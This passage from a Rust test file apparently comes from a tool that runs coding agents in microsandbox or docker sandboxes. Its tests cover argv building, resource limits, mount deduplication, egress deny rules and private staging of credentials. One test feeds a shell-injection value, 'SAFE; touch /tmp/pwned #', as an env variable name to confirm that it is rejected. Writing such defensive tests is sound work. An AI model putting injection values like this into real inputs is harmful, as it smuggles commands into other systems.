                ..Default::default()
            },
        );
        assert!(provider_for("broken", &sandboxes, &[], &SandboxIdentity::default()).is_err());
    }

    /// M5: `primitive` selects the boundary kind independently of the image.
    /// An explicit `primitive = "local"` yields the identity provider even with
    /// an image set; microsandbox/clawk yield real providers.
    #[test]
    fn provider_for_dispatches_on_primitive() {
        let mut sandboxes: BTreeMap<String, SandboxConfig> = BTreeMap::new();
        sandboxes.insert(
            "isolated".to_owned(),
            SandboxConfig {
                image: Some("busybox".to_owned()),
                primitive: "local".to_owned(),
                ..Default::default()
            },
        );
        assert_eq!(
            provider_for("isolated", &sandboxes, &[], &SandboxIdentity::default())
                .unwrap()
                .name(),
            "local"
        );

        for primitive in ["microsandbox", "clawk"] {
            sandboxes.insert(
                "vm".to_owned(),
                SandboxConfig {
                    image: Some("busybox".to_owned()),
                    primitive: primitive.to_owned(),
                    ..Default::default()
                },
            );
            let provider =
                provider_for("vm", &sandboxes, &[], &SandboxIdentity::default()).unwrap();
            assert_eq!(provider.name(), "vm");
        }

        // An unknown primitive is rejected outright.
        sandboxes.insert(
            "weird".to_owned(),
            SandboxConfig {
                image: Some("busybox".to_owned()),
                primitive: "qemu".to_owned(),
                ..Default::default()
            },
        );
        assert!(provider_for("weird", &sandboxes, &[], &SandboxIdentity::default()).is_err());
    }

    /// M4: `msb run` argv shape — image positional after flags, command after
    /// `--`, project bound at its absolute path, offline by default, HOME forced
    /// to the guest session store. Pure unit test; needs no `msb`.
    #[test]
    fn microsandbox_wrap_produces_expected_argv() {
        let session = MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-abc".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["--acp".to_owned()],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert_eq!(wrapped.program, "msb");
        assert_eq!(
            wrapped.args,
            vec![
                "run",
                "--name",
                "varda-sbx-abc",
                "--net-default",
                "deny",
                "--mount-dir",
                "/proj:/proj:rw",
                "--workdir",
                "/proj",
                "--env",
                "HOME=/home/agent",
                "busybox",
                "--",
                "claude",
                "--acp",
            ]
        );
        assert!(wrapped.env.is_empty());
        assert!(!session.store_is_live());
        // `msb cp` nests the guest HOME under its basename on the host, so the
        // discovery root is the nested dir, not the raw session_store.
        assert_eq!(
            session.session_store_root(),
            Some(PathBuf::from("/host/store/agent"))
        );
    }

    #[test]
    fn docker_memory_to_msb_mb_converts_common_grammar() {
        assert_eq!(docker_memory_to_msb_mb("4g"), Some(4096));
        assert_eq!(docker_memory_to_msb_mb("4gb"), Some(4096));
        assert_eq!(docker_memory_to_msb_mb("512m"), Some(512));
        assert_eq!(docker_memory_to_msb_mb("512mb"), Some(512));
        assert_eq!(docker_memory_to_msb_mb("1048576k"), Some(1024));
        assert_eq!(docker_memory_to_msb_mb("1073741824"), Some(1024));
        assert_eq!(docker_memory_to_msb_mb("not-a-size"), None);
        assert_eq!(docker_memory_to_msb_mb(""), None);
        assert_eq!(docker_memory_to_msb_mb("0g"), None);
    }

    /// #706 review fix: a fractional-MB value must floor down, never up — the
    /// translated ceiling must never exceed the configured one. `1000k` is
    /// 0.9765625 MB, which floors to 0 and then clamps to the 1 MB minimum.
    #[test]
    fn docker_memory_to_msb_mb_floors_fractional_mb_down() {
        assert_eq!(docker_memory_to_msb_mb("1000k"), Some(1));
    }

    /// #706 review fix: a digit-only number large enough to overflow `f64`
    /// parses to `inf`, which would otherwise silently pass the `<= 0.0` guard
    /// (a non-finite comparison is never true) and coerce into a bogus 1 MB
    /// limit instead of being rejected and warned about. (The number portion
    /// of this grammar can only ever be digits/`.`, so `inf` — not `nan` — is
    /// the realistic non-finite case here; `"nan"`/`"inf"` as literal text are
    /// covered on the `--cpus` side below, which parses the whole string.)
    #[test]
    fn docker_memory_to_msb_mb_rejects_non_finite() {
        let overflowing = format!("{}g", "1".to_owned() + &"0".repeat(309));
        assert_eq!(docker_memory_to_msb_mb(&overflowing), None);
    }

    #[test]
    fn docker_cpus_to_msb_count_floors_and_never_exceeds_the_ceiling() {
        assert_eq!(docker_cpus_to_msb_count("2"), Some(2));
        // Floors, not rounds: 1.5 configured cores must never translate to 2 —
        // that would silently grant more than the configured ceiling.
        assert_eq!(docker_cpus_to_msb_count("1.5"), Some(1));
        assert_eq!(docker_cpus_to_msb_count("1.2"), Some(1));
        // Below 1 core still clamps up to 1 — msb's minimum granularity, not a
        // ceiling violation since there is no smaller unit to floor to.
        assert_eq!(docker_cpus_to_msb_count("0.1"), Some(1));
        assert_eq!(docker_cpus_to_msb_count("0"), None);
        assert_eq!(docker_cpus_to_msb_count("bogus"), None);
    }

    /// #706 review fix: reject non-finite `--cpus` values instead of silently
    /// coercing `NaN`/`inf` into a bogus 1-core limit.
    #[test]
    fn docker_cpus_to_msb_count_rejects_non_finite() {
        assert_eq!(docker_cpus_to_msb_count("NaN"), None);
        assert_eq!(docker_cpus_to_msb_count("inf"), None);
        assert_eq!(docker_cpus_to_msb_count("-inf"), None);
    }

    /// task-limits: `memory`/`cpus` translate from the shared docker grammar onto
    /// `msb run`'s own MB-integer `--memory` and integer-core `--cpus`.
    #[test]
    fn microsandbox_wrap_emits_translated_memory_and_cpus() {
        let session = MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-abc".to_owned(),
            home: "/home/agent".to_owned(),
            memory: Some("4g".to_owned()),
            cpus: Some("1.5".to_owned()),
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        let idx = wrapped
            .args
            .iter()
            .position(|a| a == "--memory")
            .expect("--memory present");
        assert_eq!(wrapped.args[idx + 1], "4096");
        let idx = wrapped
            .args
            .iter()
            .position(|a| a == "--cpus")
            .expect("--cpus present");
        // Floors, not rounds: 1.5 configured cores must translate to AT MOST 1.5
        // cores, never more — 2 would silently exceed the configured ceiling.
        assert_eq!(wrapped.args[idx + 1], "1");
    }

    /// Credential env values cross the microsandbox boundary in a private staged
    /// file, never in the ps-visible `msb run` argv. Ordinary env stays on argv.
    #[test]
    fn microsandbox_credential_env_is_not_exposed_on_argv() {
        use std::os::unix::fs::PermissionsExt as _;

        let secret = "token with '$HOME'\nand a newline";
        let mut auth_env = BTreeMap::new();
        auth_env.insert("ANTHROPIC_API_KEY".to_owned(), secret.to_owned());
        let session = MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-secret-test".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity {
                auth_env,
                ..Default::default()
            },
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let mut env = BTreeMap::new();
        env.insert("PLAIN_SETTING".to_owned(), "visible".to_owned());
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "claude".to_owned(),
                    args: vec!["--print".to_owned()],
                    env,
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();

        assert!(
            wrapped
                .args
                .iter()
                .any(|arg| arg == "PLAIN_SETTING=visible")
        );
        assert!(!wrapped.args.iter().any(|arg| arg.contains(secret)));
        assert!(
            !wrapped
                .args
                .iter()
                .any(|arg| arg.starts_with("ANTHROPIC_API_KEY="))
        );
        assert!(wrapped.args.iter().any(|arg| {
            arg.contains(&format!(". {}", MicrosandboxSession::CREDENTIAL_ENV_FILE))
                && arg.contains("exec \"$0\" \"$@\"")
        }));

        let staged = session.staged_files.lock().unwrap();
        assert_eq!(staged.len(), 1);
        assert_eq!(staged[0].1, MicrosandboxSession::CREDENTIAL_ENV_FILE);
        let host_temp = staged[0].0.clone();
        let contents = std::fs::read_to_string(&host_temp).unwrap();
        assert_eq!(
            contents,
            "export ANTHROPIC_API_KEY='token with '\\''$HOME'\\''\nand a newline'\n"
        );
        assert_eq!(
            std::fs::metadata(&host_temp).unwrap().permissions().mode() & 0o777,
            0o444
        );
        assert_credential_dir_is_private(&host_temp);
        drop(staged);
        std::fs::remove_file(host_temp).unwrap();
    }

    #[test]
    fn microsandbox_rejects_credential_env_shell_syntax() {
        let mut auth_env = BTreeMap::new();
        auth_env.insert("SAFE; touch /tmp/pwned #".to_owned(), "secret".to_owned());
        let session = MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-invalid-env".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity {
                auth_env,
                ..Default::default()
            },
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let error = session
            .wrap(
                CommandSpec {
                    program: "claude".to_owned(),
                    args: Vec::new(),
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap_err();
        assert!(error.to_string().contains("portable shell variable name"));
        assert!(session.staged_files.lock().unwrap().is_empty());
    }

    /// #535 regression: the sandboxed-resident/orchestrate shape — an explicit
    /// `{workspace}:{workspace}:rw` mount (what `enforce_resident_launch`'s
    /// `workspace_mounted_rw` gate requires) where the workspace IS the project.
    /// The generated msb argv must (a) carry NO `--project` flag (msb 0.6.8 has
    /// none), (b) mount the project exactly ONCE, rw, host-visibly — the explicit
    /// duplicate collapses onto the auto-mount so msb never sees two volumes on the
    /// same guest path — and (c) turn the egress allow-list into `--net-default-egress
    /// deny` + one `--net-rule allow@<host>`.
    #[test]
    fn microsandbox_wrap_dedups_workspace_mount_and_maps_egress() {
        let session = MicrosandboxSession {
            image: "varda-agents:latest".to_owned(),
            project_root: PathBuf::from("/ws"),
            // The resident gate is satisfied by an explicit rw mount of the workspace
            // (== project). A second, distinct mount stays as its own guest path.
            mounts: vec![
                (MountOrigin::Route, "/ws:/ws:rw".to_owned()),
                (MountOrigin::Sandbox, "/data:/data:rw".to_owned()),
            ],
            egress: vec!["api.anthropic.com".to_owned()],
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-res".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["-p".to_owned(), "go".to_owned()],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert_eq!(wrapped.program, "msb");

        // (a) msb 0.6.8 has no `--project`; the drifted flag must be gone.
        assert!(
            !wrapped.args.iter().any(|a| a == "--project"),
            "msb 0.6.8 has no --project flag; argv: {:?}",
            wrapped.args
        );

        // (b) the project/workspace is mounted exactly once, rw, at its host path;
        // the explicit `{ws}:{ws}:rw` collapses onto the auto-mount (no dup guest path).
        let ws_mounts: Vec<&String> = wrapped
            .args
            .windows(2)
            .filter(|w| w[0] == "--mount-dir" && parse_mount(&w[1]).unwrap().target == PathBuf::from("/ws"))
            .map(|w| &w[1])
            .collect();
        assert_eq!(
            ws_mounts,
            vec![&"/ws:/ws:rw".to_owned()],
            "workspace must be mounted once, rw, host-visibly; argv: {:?}",
            wrapped.args
        );
        // No guest path appears twice across all --mount-dir specs.
        let mut seen = std::collections::HashSet::new();
        for w in wrapped.args.windows(2) {
            if w[0] != "--mount-dir" {
                continue;
            }
            let target = parse_mount(&w[1]).unwrap().target;
            assert!(
                seen.insert(target.clone()),
                "duplicate guest mount path '{}'; argv: {:?}",
                target.display(),
                wrapped.args
            );
        }
        // The distinct mount is still present as its own guest path.
        assert!(
            wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--mount-dir" && w[1] == "/data:/data:rw"),
            "distinct extra mount must survive; argv: {:?}",
            wrapped.args
        );

        // (c) egress → default-deny egress + one allow rule.
        assert!(
            wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--net-default-egress" && w[1] == "deny"),
            "non-empty egress must default-deny egress; argv: {:?}",
            wrapped.args
        );
        assert!(
            wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--net-rule" && w[1] == "allow@api.anthropic.com"),
            "egress host must become a net-rule allow; argv: {:?}",
            wrapped.args
        );
    }

    /// #546 last-mile: when a host-gated MCP broker is wired for the run (the guest
    /// env carries `VARDA_MCP_HOST`/`VARDA_MCP_ADDR`, own-kernel microVM ⇒ TCP), the
    /// msb argv must add `--net-rule allow@host` (msb denies host access by default,
    /// so the guest cannot reach `host.microsandbox.internal` without it) ALONGSIDE
    /// the per-egress-host allow rules — and only for broker-enabled runs.
    #[test]
    fn microsandbox_wrap_allows_host_group_when_broker_active() {
        let session = MicrosandboxSession {
            image: "varda-agents:latest".to_owned(),
            project_root: PathBuf::from("/ws"),
            mounts: Vec::new(),
            egress: vec!["api.anthropic.com".to_owned()],
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-broker".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        // A broker-enabled run: the TCP transport exported VARDA_MCP_HOST/PORT.
        let mut env = BTreeMap::new();
        env.insert(
            "VARDA_MCP_HOST".to_owned(),
            "host.microsandbox.internal".to_owned(),
        );
        env.insert("VARDA_MCP_PORT".to_owned(), "54321".to_owned());
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["-p".to_owned(), "go".to_owned()],
            env,
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        // The per-egress allow survives AND the host group is allowed for the broker.
        assert!(
            wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--net-rule" && w[1] == "allow@api.anthropic.com"),
            "egress host must still become a net-rule allow; argv: {:?}",
            wrapped.args
        );
        assert!(
            wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--net-rule" && w[1] == "allow@host"),
            "broker-enabled run must allow the msb `host` group; argv: {:?}",
            wrapped.args
        );
    }

    /// #546 last-mile (negative): a run with NO broker env must NOT allow the host
    /// group — the `host` rule is scoped strictly to broker-enabled runs.
    #[test]
    fn microsandbox_wrap_no_host_group_without_broker() {
        let session = MicrosandboxSession {
            image: "varda-agents:latest".to_owned(),
            project_root: PathBuf::from("/ws"),
            mounts: Vec::new(),
            egress: vec!["api.anthropic.com".to_owned()],
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-nobroker".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["-p".to_owned(), "go".to_owned()],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert!(
            !wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--net-rule" && w[1] == "allow@host"),
            "non-broker run must NOT allow the host group; argv: {:?}",
            wrapped.args
        );
    }

    /// Batch prompt delivery: `msb run` does not forward host stdin into the
    /// guest, so a batch prompt staged as a guest file (`VARDA_PROMPT_FILE` set)
    /// must be redirected into the agent's stdin IN-GUEST via
    /// `sh -c 'exec "$0" "$@" < "$VARDA_PROMPT_FILE"' <program> <args>`. Batch
    /// WITHOUT a staged prompt, and interactive mode, keep the bare command.
    #[test]
    fn microsandbox_batch_redirects_staged_prompt_into_stdin() {
        let make = || MicrosandboxSession {
            image: "varda-agents:latest".to_owned(),
            project_root: PathBuf::from("/ws"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-prompt".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        assert!(make().prompt_via_file(), "msb must deliver batch prompt by file");

        let cmd_tail = |wrapped: &CommandSpec| -> Vec<String> {
            let sep = wrapped
                .args
                .iter()
                .position(|a| a == "--")
                .expect("msb argv must have a `--` separator");
            wrapped.args[sep + 1..].to_vec()
        };
        let redirect = r#"exec "$0" "$@" < "$VARDA_PROMPT_FILE""#.to_owned();

        // Batch + staged prompt file -> sh -c redirect wraps the agent command.
        let mut env = BTreeMap::new();
        env.insert(
            "VARDA_PROMPT_FILE".to_owned(),
            "/opt/varda/prompt.txt".to_owned(),
        );
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["-p".to_owned(), "--add-dir".to_owned(), "/ws".to_owned()],
            env,
            cwd: None,
        };
        let wrapped = make().wrap(spec, LaunchMode::Batch).unwrap();
        assert_eq!(
            cmd_tail(&wrapped),
            vec![
                "sh".to_owned(),
                "-c".to_owned(),
                redirect.clone(),
                "claude".to_owned(),
                "-p".to_owned(),
                "--add-dir".to_owned(),
                "/ws".to_owned(),
            ],
            "batch staged prompt must redirect stdin in-guest",
        );

        // Batch WITHOUT a staged prompt -> bare command, no redirect.
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["-p".to_owned()],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = make().wrap(spec, LaunchMode::Batch).unwrap();
        assert_eq!(cmd_tail(&wrapped), vec!["claude".to_owned(), "-p".to_owned()]);

        // Interactive with VARDA_PROMPT_FILE -> NOT wrapped (its command reads the
        // file itself); the batch redirect must be batch-only.
        let mut env = BTreeMap::new();
        env.insert(
            "VARDA_PROMPT_FILE".to_owned(),
            "/opt/varda/prompt.txt".to_owned(),
        );
        let inner = "claude \"$(cat $VARDA_PROMPT_FILE)\"".to_owned();
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec!["-c".to_owned(), inner.clone()],
            env,
            cwd: None,
        };
        let wrapped = make().wrap(spec, LaunchMode::Interactive).unwrap();
        assert_eq!(cmd_tail(&wrapped), vec!["sh".to_owned(), "-c".to_owned(), inner]);
    }

    /// #535 iteration 2 regression: the live-captured failure was TWO `--mount-dir`
    /// with the SAME SOURCE at DIFFERENT guest targets — `/ws:/ws:rw` (project
    /// auto-mount) and `/ws:/workspace:rw` (the resident gate's explicit mount).
    /// msb refuses the same source bound at more than one guest path (its error
    /// reads "same guest path" but the true cause is the shared source), and a
    /// target-only dedup does NOT catch this because the targets differ. The
    /// `seen_sources` dedup must collapse the explicit same-source mount onto the
    /// single rw project bind, while a genuinely distinct source survives.
    #[test]
    fn microsandbox_wrap_dedups_same_source_at_different_target() {
        let session = MicrosandboxSession {
            image: "varda-agents:latest".to_owned(),
            project_root: PathBuf::from("/ws"),
            // Same source as the project (/ws) but a DIFFERENT guest target — the
            // exact shape the resident gate produced that broke msb.
            mounts: vec![
                (MountOrigin::Route, "/ws:/workspace:rw".to_owned()),
                (MountOrigin::Sandbox, "/data:/data:rw".to_owned()),
            ],
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-src".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["-p".to_owned(), "go".to_owned()],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();

        // The source /ws is bound exactly ONCE — as the project bind /ws:/ws:rw —
        // and the redundant /ws:/workspace:rw is dropped by the source dedup.
        let ws_source_mounts: Vec<&String> = wrapped
            .args
            .windows(2)
            .filter(|w| w[0] == "--mount-dir" && parse_mount(&w[1]).unwrap().source == PathBuf::from("/ws"))
            .map(|w| &w[1])
            .collect();
        assert_eq!(
            ws_source_mounts,
            vec![&"/ws:/ws:rw".to_owned()],
            "source /ws must be mounted exactly once (the project bind); argv: {:?}",
            wrapped.args
        );
        // The redundant same-source mount at /workspace must NOT appear.
        assert!(
            !wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--mount-dir" && w[1] == "/ws:/workspace:rw"),
            "same-source duplicate at a different target must be dropped; argv: {:?}",
            wrapped.args
        );
        // A mount with a genuinely distinct source at a distinct target survives.
        assert!(
            wrapped
                .args
                .windows(2)
                .any(|w| w[0] == "--mount-dir" && w[1] == "/data:/data:rw"),
            "distinct-source mount must survive; argv: {:?}",
            wrapped.args
        );
    }

    // ---- M13a: interactive launch contract (deterministic argv) ----

    /// M13a §2: docker Interactive uses the create/cp/start lifecycle — the argv
    /// is `docker create … -it …` (NOT `run`, NOT `-i`), so `begin_interactive`
    /// can `docker cp` the prompt in before `docker start -ai` attaches the TTY.
    #[test]
    fn docker_interactive_wrap_uses_create_and_it() {
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/s1");
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Interactive).unwrap();
        assert_eq!(wrapped.program, "docker");
        assert_eq!(
            wrapped.args[0], "create",
            "interactive must create, not run"
        );
        assert!(
            wrapped.args.iter().any(|a| a == "-it"),
            "must allocate a TTY"
        );
        assert!(!wrapped.args.iter().any(|a| a == "-i" && a != "-it"));
    }

    /// M13a §2: docker Batch keeps the pre-M13a `run -i` streaming form unchanged.
    #[test]
    fn docker_batch_wrap_keeps_run_and_i() {
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/s1");
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert_eq!(wrapped.args[0], "run");
        assert!(wrapped.args.iter().any(|a| a == "-i"));
        assert!(!wrapped.args.iter().any(|a| a == "-it"));
    }

    /// M13a §3/§5: docker `stage_file` records the prompt for a deferred
    /// `docker cp` and returns the GUEST path (used for `VARDA_PROMPT_FILE`).
    #[test]
    fn docker_stage_file_returns_guest_path_and_records() {
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/s1");
        let guest = session
            .stage_file("hello prompt", "/home/agent/.varda-prompt.txt")
            .unwrap();
        assert_eq!(guest, "/home/agent/.varda-prompt.txt");
        let staged = session.staged_files.lock().unwrap();
        assert_eq!(staged.len(), 1);
        assert_eq!(staged[0].1, "/home/agent/.varda-prompt.txt");
        // The host temp actually holds the content, ready for `docker cp`.
        assert_eq!(
            std::fs::read_to_string(&staged[0].0).unwrap(),
            "hello prompt"
        );
        let _ = std::fs::remove_file(&staged[0].0);
    }

    /// M11-ext fix2 Finding 1 (docker): a staged credential host temp is `0o400`
    /// and NEVER group/world-accessible — asserted immediately after
    /// `stage_credential_file` returns. The value is never reachable by another
    /// local user at any point: the containing directory is created `0o700` before
    /// the file exists, so there is no create-time window regardless of umask.
    #[test]
    fn m11ext_docker_staged_credential_private_at_creation() {
        use std::os::unix::fs::PermissionsExt as _;
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/priv");
        session
            .stage_credential_file("top-secret-value", "/home/agent/.tok")
            .unwrap();
        let host_temp = session.staged_files.lock().unwrap()[0].0.clone();
        let mode = std::fs::metadata(&host_temp).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o444,
            "credential temp must be exactly 0o444, got {mode:o}"
        );
        assert_credential_dir_is_private(&host_temp);
        // The FILE is deliberately group/world-readable so the non-root guest agent
        // can read it after a mode-preserving copy; unreachability is enforced one
        // level up, by the 0o700 directory asserted above.
        let dir_mode = {
            let dir = host_temp.parent().unwrap();
            std::fs::metadata(dir).unwrap().permissions().mode() & 0o077
        };
        assert_eq!(
            dir_mode, 0,
            "credential stage DIR must never be group/world-accessible"
        );
        let _ = std::fs::remove_file(&host_temp);
    }

    /// M11-ext fix2 Finding 2 (docker): if `docker cp` fails (or errors) AFTER the
    /// staged list is drained, the credential host temp must STILL be removed —
    /// teardown can no longer see it, so `create_cp_start` cleans it up on the
    /// error path. We stand in `true` for `docker create` so it succeeds and the
    /// list is drained, then the real `docker cp` fails (nonexistent container /
    /// no daemon), exercising the drained-then-error cleanup.
    #[tokio::test]
    async fn m11ext_docker_cp_failure_removes_staged_temp() {
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/cpfail");
        session
            .stage_credential_file("scoped-secret", "/home/agent/.tok")
            .unwrap();
        let host_temp = session.staged_files.lock().unwrap()[0].0.clone();
        assert!(host_temp.exists());
        let wrapped = CommandSpec {
            program: "true".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let result = session.create_cp_start(wrapped).await;
        assert!(
            result.is_err(),
            "`docker cp` against a nonexistent container must fail"
        );
        assert!(
            !host_temp.exists(),
            "credential host temp must be removed even when `docker cp` fails"
        );
    }

    /// M11-ext fix3: the cleanup guard is armed BEFORE `docker create`, so a
    /// `docker create` FAILURE (before any `docker cp`) must ALSO remove the staged
    /// credential host temp — without relying on a separate teardown pass. We stand
    /// in `false` for `docker create` so it exits non-zero; the guard's `Drop` on
    /// the early `bail!` is the sole thing that clears the credential VALUE.
    #[tokio::test]
    async fn m11ext_docker_create_failure_removes_staged_temp() {
        let session = DockerSession::for_test(
            "img",
            "/proj",
            vec![],
            vec![],
            "/var/varda/sessions/createfail",
        );
        session
            .stage_credential_file("create-fail-secret", "/home/agent/.tok")
            .unwrap();
        let host_temp = session.staged_files.lock().unwrap()[0].0.clone();
        assert!(host_temp.exists());
        let wrapped = CommandSpec {
            program: "false".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let result = session.create_cp_start(wrapped).await;
        assert!(
            result.is_err(),
            "a failing `docker create` must surface an error"
        );
        assert!(
            !host_temp.exists(),
            "credential host temp must be removed even when `docker create` fails"
        );
    }

    /// M13a §2/§3: msb Interactive adds `-t` and a pre-boot `--copy-file` per
    /// staged file (native copy — no docker-style create/cp/start dance).
    #[test]
    fn microsandbox_interactive_wrap_adds_tty_and_copy_file() {
        let session = MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-abc".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let guest = session
            .stage_file("task text", "/home/agent/.varda-prompt.txt")
            .unwrap();
        assert_eq!(guest, "/home/agent/.varda-prompt.txt");
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Interactive).unwrap();
        assert!(
            wrapped.args.iter().any(|a| a == "-t"),
            "must allocate a TTY"
        );
        let copy_idx = wrapped
            .args
            .iter()
            .position(|a| a == "--copy-file")
            .expect("interactive msb must stage the prompt via --copy-file");
        assert!(
            wrapped.args[copy_idx + 1].ends_with(":/home/agent/.varda-prompt.txt"),
            "copy-file target must be the guest prompt path, got {}",
            wrapped.args[copy_idx + 1]
        );
        let staged = session.staged_files.lock().unwrap();
        let _ = std::fs::remove_file(&staged[0].0);
    }

    /// M13a §2: msb Batch does not allocate a TTY or stage files.
    #[test]
    fn microsandbox_batch_wrap_has_no_tty() {
        let session = MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-abc".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert!(!wrapped.args.iter().any(|a| a == "-t"));
        assert!(!wrapped.args.iter().any(|a| a == "--copy-file"));
    }

    /// M13a §1/§2: the `local` identity provider is unchanged for BOTH modes, so
    /// the un-sandboxed interactive argv is byte-for-byte the pre-M13a command.
    #[test]
    fn local_interactive_wrap_is_identity() {
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["--foo".to_owned()],
            env: BTreeMap::new(),
            cwd: Some(PathBuf::from("/work")),
        };
        let batch = LocalSession.wrap(spec.clone(), LaunchMode::Batch).unwrap();
        let interactive = LocalSession
            .wrap(spec.clone(), LaunchMode::Interactive)
            .unwrap();
        assert_eq!(batch, spec);
        assert_eq!(interactive, spec);
    }

    /// M13b: a REAL coding agent (not a bare `sh`) launched interactively under
    /// docker must (a) take the create/cp/start `-it` lifecycle, (b) carry the
    /// staged prompt path as `-e VARDA_PROMPT_FILE=<guest path>` so the wrapped
    /// `sh -c 'claude "$(cat $VARDA_PROMPT_FILE)" …'` reads the task in-guest, and
    /// (c) keep the agent argv intact after the image name. The prompt is staged
    /// via the same deferred `docker cp` the shell path uses.
    #[test]
